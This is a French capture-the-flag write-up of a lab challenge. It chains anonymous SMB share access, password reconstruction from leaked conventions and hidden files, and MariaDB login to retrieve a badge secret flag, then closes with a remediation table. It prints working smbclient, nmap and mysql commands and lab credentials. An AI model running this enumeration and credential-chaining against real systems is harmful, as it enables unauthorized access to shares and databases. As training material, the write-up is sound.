# Fret Savane Appui — chaîne SMB → MariaDB jusqu'au badge

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/fret-savane-appui/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Un partage SMB anonyme livre une convention de mot de passe et des
> fichiers cachés. On reconstruit le mot de passe de `kofi`, qui ouvre un second
> partage contenant les éléments du mot de passe MariaDB. Dans la base
> `savane_agents`, l'agent lié au dernier `EXPORT_MANIFEST` porte le badge
> secret. Flag : `NCTF{7bf0…}`.


## 1. Briefing

> *« Fret Savane exploite un petit serveur d'atelier IT entre Kara, Lomé et
> Cinkassé. Des partages et une base agents sont exposés sur le LAN. Retrouve le
> secret de badge lié au dernier export de manifeste entrepôt. »*

| Élément | Valeur |
|---------|--------|
| Cible | `10.100.13.101` (VPN d'équipe), hôte `savane-atelier-01` |
| Ports | 139/445 (SMB), 3306 (MariaDB) |
| Format du flag | `NCTF{...}` |

## 2. Reconnaissance

```
$ nmap -sT -p 139,445,3306 -Pn 10.100.13.101
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql

$ smbclient -L //10.100.13.101 -N
AppuiTech   Disk   Appui technique prestataires
DevPartage  Disk   Partage interne developpement
```

## 3. Exploitation

### Étape 1 — partage `AppuiTech` (anonyme)

Lecture anonyme autorisée. On récupère tout, y compris les fichiers cachés :

```bash
smbclient //10.100.13.101/AppuiTech -N -c 'prompt OFF; recurse ON; mget *; mget .*'
```

| Fichier | Rôle |
|---------|------|
| `atelier_inventory.txt` | code site `KRA`, année `2025` |
| `old_ticket_FS-ATELIER-2417.txt` | convention `{PrenomCourt}!{SiteCode}{Year}-<.atelier_id>` |
| `chat_support_lome.txt` | utilisateur `kofi` ; suffixe dans `.atelier_id` |
| `.atelier_id` (caché) | `15be` |

Mot de passe SMB reconstruit pour `kofi` : `Kofi!KRA2025-15be`.

### Étape 2 — partage `DevPartage` (authentifié)

```bash
smbclient //10.100.13.101/DevPartage -U 'kofi%Kofi!KRA2025-15be' \
  -c 'prompt OFF; recurse ON; mget *; mget .*'
```

| Fichier | Rôle |
|---------|------|
| `db_note.txt` | MariaDB `:3306`, db `savane_agents`, user `savane_ro`, mdp = `materiel_code` Cinkassé + `#` + `.db_epoch` |
| `inventory.csv` | Cinkassé (`ENT-CKS`) → `materiel_code = C1nkasse` |
| `.db_epoch` (caché) | `5e7e` |

> [!WARNING]
> `old_credentials.txt` (*mssql_sa / Summer2023!@sa*) est un leurre : service
> retiré, port 1433 fermé.

Mot de passe MariaDB reconstruit : `C1nkasse#5e7e`.

### Étape 3 — base MariaDB `savane_agents`

Le serveur rejette TLS sur cette version ; forcer `--skip-ssl` :

```bash
mysql -h 10.100.13.101 -u savane_ro -p'C1nkasse#5e7e' --skip-ssl savane_agents
```

```sql
SELECT * FROM access_logs WHERE action='EXPORT_MANIFEST' ORDER BY created_at DESC;
```

| id | agent_id | action | warehouse | created_at |
|----|----------|--------|-----------|------------|
| 4 | **103** | EXPORT_MANIFEST | Cinkasse | 2025-03-12 16:45:00 ← dernier |
| 3 | 106 | EXPORT_MANIFEST | Cinkasse | 2025-03-11 07:30:00 |

Agent `103` = **Komlan Tete** (Cinkassé). Dans `badges`, agent 103 →
`badge_code = CK-KOM`, `secret = NCTF{7bf0…}`. Les cinq autres
lignes (`rot_old_atelier_key`, `ops_desk_token_xx`, …) sont des leurres non liés
au dernier export.

## 4. Flag
```
NCTF{7bf0…}
```

## 5. Impasses & dépannage
- Sans `--skip-ssl`, le client MariaDB échoue sur une négociation TLS que le
  serveur refuse.
- `.atelier_id`, `.db_epoch` et la valeur `secret` tournent à chaque redéploiement ;
  il faut re-tirer les partages et reconstruire les deux mots de passe. L'agent
  cible (`id=103`) reste toujours celui du dernier manifeste.

## 6. Leçons & remédiation
| Faiblesse | Cause racine | Correctif |
|-----------|--------------|-----------|
| Partage anonyme | SMB en lecture sans auth, fichiers cachés inclus | Désactiver l'accès invité ; ne pas stocker de secrets sur un partage |
| Chaînage de mots de passe | Conventions de mot de passe documentées sur le partage | Mots de passe aléatoires, jamais dérivés d'une règle publiée |
| Secret en base | Badge secret stocké en clair | Chiffrer/hacher les secrets, restreindre les droits du compte applicatif |
